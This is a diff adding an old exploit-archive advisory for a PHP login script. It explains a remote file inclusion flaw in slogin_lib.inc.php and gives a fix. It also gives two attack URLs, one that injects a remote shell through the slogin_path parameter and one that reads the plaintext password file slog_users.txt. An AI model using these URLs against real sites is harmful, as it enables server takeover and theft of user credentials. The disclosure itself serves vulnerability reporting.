@@ -1,0 +1,69 @@
+[START]
+
+#########################################################################################
+[0x01] Informations:
+
+Script         : Simple Text-File Login script 1.0.6
+Download       : http://www.hotscripts.com/jump.php?listing_id=36777&jump_type=1
+Vulnerability  : Remote File Inclusion / Sensitive Data Disclosure
+Author         : Osirys
+Contact        : osirys[at]live[dot]it
+Notes          : Proud to be Italian
+Greets:        : XaDoS, x0r, emgent, Jay
+Notes          : *
+
+* The name of this login system is Simple Text-File Login script, so we can already 
+  understand that this script will use a .txt file to do his job. So it's like if
+  the coder didn't think that a login system like this isn't vulnerable. Weird !
+  Anyway, it's vulnerable to Remote File Inclusion also, here we are !
+
+#########################################################################################
+[0x02] Bug:[Remote File Inclusion]
+######
+
+Bugged file is: /[path]/slogin_lib.inc.php
+
+[CODE]
+90.  if (!isset ($slogin_path)) {
+91.    $slogin_path = "";
+92. }
+[/CODE]
+
+If $slogin_path is not given, becomes a null variable. Scrolling down the source code,
+you can see an include of that variable everywhere.
+Just one of the few vulnerable includes:
+
+[CODE] include_once ($slogin_path . "header.inc.php"); [/CODE]
+
+FIX: Just declare $slogin_path. An example of a bugged inclusion in the source is this:
+
+[CODE] include_once ($slogin_path . "header.inc.php"); [/CODE]
+
+The header.inc.php file, such as all the files of this cms, is in the same dir of
+slogin_lib.inc.php, so a fix could be just to include the file, without including
+a variable, which should be null becouse all the files are in the same dir.
+
+[CODE] include_once ("header.inc.php"); # <-- This is a secure include. [/CODE]
+
+
+[!] EXPLOIT: /[path]/slogin_lib.inc.php?slogin_path=[remote_txt_shell]
+
+########################################################################################
+[0x03] Bug:[Sensitive Data Disclosure]
+######
+
+* As I already said, this is not a real bug, becouse is the intention of the author
+  to use a .txt file as a login storage. But it's weird, it's unsecure ! Maybe he just 
+  sees the goodness of people (hehe xD)
+
+In this login system, sensible datas like username and password are stored in a local
+text file , so we can get sensitive information just going to this txt file . The name of
+this file is set in slogin_lib.inc.php. By default is: slog_users.txt
+
+[!] EXPLOIT: /[path]/slog_users.txt
+
+#########################################################################################
+
+[/END]
+
+# milw0rm.com [2008-12-14]
